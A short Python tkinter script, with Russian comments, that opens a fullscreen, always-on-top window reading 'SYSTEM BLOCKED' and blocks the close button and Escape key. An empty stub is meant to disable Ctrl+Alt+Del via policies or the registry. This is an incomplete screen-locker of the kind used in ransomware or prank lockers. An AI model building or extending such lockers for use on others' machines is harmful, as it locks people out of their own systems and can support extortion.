import ctypes
import tkinter as tk

def disable_ctrl_alt_del():
    # Только на Windows Pro с политиками или через реестр
    pass

root = tk.Tk()
root.attributes('-fullscreen', True)
root.attributes('-topmost', True)
root.protocol("WM_DELETE_WINDOW", lambda: None)  # Блокирует закрытие
root.bind('<Escape>', lambda e: None)  # Блок Esc
label = tk.Label(root, text="СИСТЕМА ЗАБЛОКИРОВАНА", fg="white", bg="black", font=("Arial", 50))
label.pack(expand=True)
root.mainloop()
